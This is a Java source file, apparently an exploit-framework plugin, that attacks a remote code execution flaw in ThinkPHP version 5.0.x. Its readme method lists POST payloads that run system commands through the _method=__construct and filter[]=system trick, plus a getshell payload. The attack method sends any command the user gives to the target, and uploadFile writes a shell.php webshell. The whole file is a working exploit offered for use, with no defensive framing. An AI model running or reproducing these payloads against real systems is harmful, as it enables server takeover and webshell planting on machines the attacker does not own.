package com.plugin;

import org.apache.http.HttpEntity;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;


/**
 * 用户只需要修改readme方法 以及attack方法和uploadFile方法
 */
public class Exp {

    /**
     *
     * @param url               目标域名
     * @param getParameter      get参数
     * @param cookies           cookie
     * @return                  请求结果
     */
    public String get(String url ,String getParameter, String cookies) {
        HttpGet httpGet = null;
        // 获取http客户端
        CloseableHttpClient httpClient = HttpClientBuilder.create().build();
        try {
            String newUrl = url +"/?" + URLEncoder.encode(getParameter, "UTF-8");
            newUrl = newUrl
                    .replace("%3D", "=")
                    .replace("%26", "&");
            httpGet = new HttpGet(newUrl);
            RequestConfig requestConfig = RequestConfig
                    .custom()
                    .setConnectTimeout(5000)
                    .setConnectionRequestTimeout(5000)
                    .setSocketTimeout(5000)
                    .setRedirectsEnabled(true)
                    .build();
            if (cookies != null && !cookies.equals("") ) {
                httpGet.addHeader("cookie", cookies);
            }
            httpGet.addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36");
            httpGet.addHeader("Content-Type", "application/json;charset=utf8");
            httpGet.setConfig(requestConfig);

            CloseableHttpResponse response = httpClient.execute(httpGet);

            HttpEntity entity = response.getEntity();

            return EntityUtils.toString(entity);

        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        } catch (ClientProtocolException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return "";
    }

    /**
     *
     * @param url          目标域名
     * @param param         参数
     * @param cookies       cookies
     * @return 请求返回结果
     */
    public String post(String url ,List<NameValuePair> param, String cookies) {
        HttpPost httpPost = null;
        // 获取http客户端
        CloseableHttpClient httpClient = HttpClientBuilder.create().build();
        try {
            httpPost = new HttpPost(url);

            RequestConfig requestConfig = RequestConfig
                    .custom()
                    .setConnectTimeout(5000)
                    .setConnectionRequestTimeout(5000)
                    .setSocketTimeout(5000)
                    .setRedirectsEnabled(true)
                    .build();
            if (cookies != null && !cookies.equals("") ) {
                httpPost.addHeader("cookie", cookies);
            }
            httpPost.addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36");
            httpPost.setConfig(requestConfig);

            httpPost.setEntity(new UrlEncodedFormEntity(param, "UTF-8"));
            CloseableHttpResponse response = httpClient.execute(httpPost);

            HttpEntity entity = response.getEntity();

            return EntityUtils.toString(entity);

        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        } catch (ClientProtocolException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return "";
    }

    public String readme() {
        /*
        漏洞介绍只需要修改sb.append函数里面的内容
         */
        StringBuffer sb = new StringBuffer();
        sb.append("version: 5.0.2\n");
        sb.append("******************************\n");
        sb.append("复现过程:\n");
        sb.append("******************************\n");
        sb.append("POST:\n");
        sb.append("s=whoami&_method=__construct&method=POST&filter[]=system\n");
        sb.append("aaaa=whoami&_method=__construct&method=GET&filter[]=system\n");
        sb.append("_method=__construct&method=GET&filter[]=system&get[]=whoami\n");
        sb.append("******************************\n");
        sb.append("getshell\n");
        sb.append("******************************\n");
        sb.append("s=file_put_contents('zerosec.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert\n");
        return sb.toString();
    }

    /**
     * 攻击方法
     * @param url           url
     * @param command       命令
     * @param cookies       cookies
     * @return
     */
    public String attack(String url, String command, String cookies) {


        /*
        post 方式  new BasicNameValuePair 里面的key value
        第一个参数为post提交的key
        第二个参数为post提交的value
        例如 post提交的参数为 s=whoami&_method=__construct&method=POST&filter[]=system
        则构造如下的代码
         */
        List<NameValuePair> l = new ArrayList();
        l.add(new BasicNameValuePair("s", command));
        l.add(new BasicNameValuePair("_method", "__construct"));
        l.add(new BasicNameValuePair("method", "POST"));
        l.add(new BasicNameValuePair("filter[]", "system"));

        String post = post(url, l, "");
        return post;
    }

    /**
     *
     * @param url           目标域名
     * @param fileContent   文件内容
     * @return
     */
    public boolean uploadFile(String url, String fileContent) {

        /*
        post 方式  new BasicNameValuePair 里面的key value
        第一个参数为post提交的key
        第二个参数为post提交的value
        例如 post提交的参数为 s=file_put_contents('shell.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
        则构造如下的代码 其中 shell.php
        由于上传的文件内容可变， 所以采用字符串拼接的方式 拼接进去
         */
        fileContent = fileContent.replace("'", "\"");
        List<NameValuePair> l = new ArrayList();
        l.add(new BasicNameValuePair("s", "file_put_contents('shell.php','"+fileContent+"')"));
        l.add(new BasicNameValuePair("_method", "__construct"));
        l.add(new BasicNameValuePair("method", "POST"));
        l.add(new BasicNameValuePair("filter[]", "assert"));
        String post = post(url, l, "");
        if (post.contains("file_put_contents")) return true;
        return false;
    }

}
